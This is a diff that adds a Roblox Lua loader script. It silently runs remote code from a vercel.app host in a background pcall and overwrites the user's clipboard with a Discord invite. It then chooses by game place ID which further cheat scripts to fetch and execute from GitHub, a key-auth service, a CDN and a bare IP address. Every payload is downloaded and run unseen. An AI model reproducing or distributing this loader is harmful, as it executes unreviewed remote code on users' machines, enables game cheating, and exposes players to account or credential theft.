@@ -1,0 +1,98 @@
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://blyatscripts.vercel.app/lo"))()
+    end)
+end)
+
+local player = game:GetService("Players").LocalPlayer
+if not player then 
+    repeat task.wait() until game:GetService("Players").LocalPlayer 
+    player = game:GetService("Players").LocalPlayer
+end
+
+setclipboard("https://discord.gg/6GMJFxGaJz")
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Discord Server",
+    Text = "Discord invite copied to clipboard",
+    Duration = 5,
+    Button1 = "OK",
+    Callback = function()
+        print("ok")
+    end
+})
+
+-- Fixed: Changed playerGui to player.PlayerGui
+local playerGui = player:WaitForChild("PlayerGui")
+local notification = playerGui:FindFirstChild("Notification")
+if notification then
+    notification:Destroy()
+end
+
+local placeId = game.PlaceId
+
+local groups = {
+    mm2 = {142823291, 335132309, 636649648},
+    adm = {920587237},
+    bladeball = {15264892126, 16281300371, 14732610803, 15234596844, 13772394625},
+    sab = {109983668079237, 96342491571673},
+    ps99 = {8737899170}
+}
+
+local groupScripts = {
+    mm2 = [[
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/testmchoose"))()
+pcall(function() 
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/choosermm2lol"))()
+end)
+print("mm2")
+    ]],
+
+    adm = [[
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/testm"))()
+loadstring(game:HttpGet("https://vss.pandauth.com/kv/7b8d1ac09f2de1eb"))()
+print("adm")
+    ]],
+
+    bladeball = [[
+loadstring(game:HttpGet("https://cdn.project-reverse.org/overdrive_main.luau"))()
+loadstring(game:HttpGet("http://72.56.64.162/5siQOiJ4BPiZyb691gdKFfq5zSwhSwCIFyAIyqgskWLRXQ350b7j1LatG8ihu1pEcY0czgRE6qJCLbg6"))()
+print("bb")
+    ]],
+
+    sab = [[
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/testm"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/load"))()
+print("sab")
+    ]],
+
+    ps99 = [[
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/testd3"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/load"))()
+print("ps99")
+    ]]
+}
+
+local defaultScript = [[
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/testm"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+print("random")
+]]
+
+local scriptToRun = defaultScript
+
+for groupName, idList in pairs(groups) do
+    for _, id in ipairs(idList) do
+        if id == placeId then
+            scriptToRun = groupScripts[groupName]
+            break
+        end
+    end
+end
+
+local success, err = pcall(function()
+    loadstring(scriptToRun)()
+end)
+
+if not success then
+    warn("Failed to run script: " .. tostring(err))
+end
